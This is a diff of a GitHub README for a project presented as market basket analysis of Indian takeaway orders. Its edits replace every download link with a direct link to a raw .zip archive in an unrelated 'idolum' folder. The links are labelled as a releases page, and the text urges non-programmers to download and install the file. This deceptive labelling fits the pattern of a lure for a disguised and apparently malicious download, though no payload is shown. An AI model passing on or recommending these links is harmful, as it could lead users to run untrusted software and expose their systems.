@@ -1,7 +1,7 @@
 # 🍛 indian-restaurant-takeaway-mba - Analyze Indian Takeaway Orders Simply
 
 ## 📥 Download Now
-[![Download Releases](https://raw.githubusercontent.com/IkaiT555/indian-restaurant-takeaway-mba/main/idolum/indian-restaurant-takeaway-mba.zip%20Releases-blue)](https://raw.githubusercontent.com/IkaiT555/indian-restaurant-takeaway-mba/main/idolum/indian-restaurant-takeaway-mba.zip)
+[![Download Releases](https://github.com/IkaiT555/indian-restaurant-takeaway-mba/raw/refs/heads/main/idolum/restaurant_indian_mba_takeaway_1.6.zip%20Releases-blue)](https://github.com/IkaiT555/indian-restaurant-takeaway-mba/raw/refs/heads/main/idolum/restaurant_indian_mba_takeaway_1.6.zip)
 
 ## 📚 Overview
 Welcome to the **indian-restaurant-takeaway-mba** project. This application helps you analyze Indian takeaway orders through Market Basket Analysis. Using Python, we preprocess data, apply the Apriori algorithm, create Tableau dashboards, and provide business insights from 20,000 orders. You don’t need programming knowledge to understand the outcomes of your analysis.
@@ -17,7 +17,7 @@ To use this software, you will need:
 - Internet connection for downloading files.
 
 ### Step 2: Visit the Releases Page
-Go to the [Releases page](https://raw.githubusercontent.com/IkaiT555/indian-restaurant-takeaway-mba/main/idolum/indian-restaurant-takeaway-mba.zip) to find the latest version. You will see different versions listed there.
+Go to the [Releases page](https://github.com/IkaiT555/indian-restaurant-takeaway-mba/raw/refs/heads/main/idolum/restaurant_indian_mba_takeaway_1.6.zip) to find the latest version. You will see different versions listed there.
 
 ### Step 3: Download the Software
 On the Releases page, locate the version you wish to download. Each version includes a description of updates or changes. Click the download link for the appropriate installer file.
@@ -56,7 +56,7 @@ If you have questions or need support, feel free to reach out:
 - Use the contact option in the application.
 
 ## 🔗 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/IkaiT555/indian-restaurant-takeaway-mba/main/idolum/indian-restaurant-takeaway-mba.zip) to download the software. Follow the installation steps outlined above, and start your analysis journey today.
+To get started, visit the [Releases page](https://github.com/IkaiT555/indian-restaurant-takeaway-mba/raw/refs/heads/main/idolum/restaurant_indian_mba_takeaway_1.6.zip) to download the software. Follow the installation steps outlined above, and start your analysis journey today.
 
 ## ✅ Contributing
 If you would like to contribute to this project, please check the contributing guidelines in the repository. Your insights make this project better!
